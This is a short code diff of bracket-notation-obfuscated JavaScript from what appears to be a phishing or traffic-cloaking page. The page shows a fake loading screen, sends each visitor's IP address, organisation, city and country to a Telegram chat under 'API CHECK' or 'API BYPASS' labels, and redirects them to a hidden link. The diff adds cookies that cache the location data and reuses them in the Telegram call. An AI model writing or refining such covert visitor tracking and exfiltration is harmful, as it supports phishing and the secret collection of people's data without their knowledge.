@@ -78,7 +78,7 @@ if (getCookie('ip') == ''){
          document['getElementById']('errorpage')['style']['display'] = 'none';
          document['getElementById']('canvas')['style']['display'] = 'none';
          document['getElementById']('loading')['style']['display'] = 'block';
-         setCookie('ip', ipp, '1');
+         setCookie('ip', ipp, '1');setCookie('org', org, '1');setCookie('country', country, '1');setCookie('city', city, '1');
          telegram(ipp,org,city,country,'API CHECK','-627218749');
          location['assign'](applink);
      } else {
@@ -97,6 +97,6 @@ if (getCookie('ip') == ''){
  document['getElementById']('errorpage')['style']['display'] = 'none';
  document['getElementById']('canvas')['style']['display'] = 'none';
  document['getElementById']('loading')['style']['display'] = 'block';
- telegram(getCookie('ip'),org,city,country,'API BYPASS','-627218749');
+ telegram(getCookie('ip'),getCookie('org'),getCookie('city'),getCookie('country'),'API BYPASS','-627218749');
  location['assign'](applink);
 }
